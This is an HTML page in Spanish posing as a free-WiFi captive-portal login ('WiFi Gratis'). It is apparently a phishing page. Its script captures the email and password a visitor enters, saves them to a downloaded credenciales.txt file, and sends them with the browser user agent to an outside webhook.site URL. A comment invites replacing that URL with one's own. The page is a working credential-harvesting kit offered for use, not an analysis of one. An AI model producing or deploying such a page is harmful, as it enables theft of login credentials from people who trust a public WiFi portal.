<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Gratis - Iniciar Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0077d6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Gratis</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Correo electrónico" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar Sesión</button>
        </form>
        <button id="getFreeWiFi" style="margin-top: 15px;">Obtener WiFi Gratis</button>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const getFreeWiFiBtn = document.getElementById('getFreeWiFi');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Guardar localmente (para demostración)
            guardarDatosLocalmente(email, password);
            
            // Enviar a webhook/backend
            await enviarDatos(email, password);
            
            alert("¡Datos guardados! Presiona 'Obtener WiFi Gratis' para continuar.");
        });

        getFreeWiFiBtn.addEventListener('click', function() {
            alert("¡WiFi gratis para ti! Gracias por tus datos.");
        });

        function guardarDatosLocalmente(email, password) {
            const datos = `Correo: ${email}\nContraseña: ${password}\nFecha: ${new Date().toLocaleString()}`;
            const blob = new Blob([datos], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'credenciales.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        async function enviarDatos(email, password) {
            // Opción 1: Enviar a un webhook (debes reemplazar la URL)
            // Por ejemplo, usa webhook.site para pruebas o un servicio como Formspree
            const webhookURL = 'https://webhook.site/dc166330-1516-42d7-bacb-74c2d6af8aef'; // Reemplaza con tu URL
            
            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
                
                console.log('Datos enviados correctamente');
            } catch (error) {
                console.error('Error al enviar datos:', error);
            }
        }
    </script>
</body>
</html>
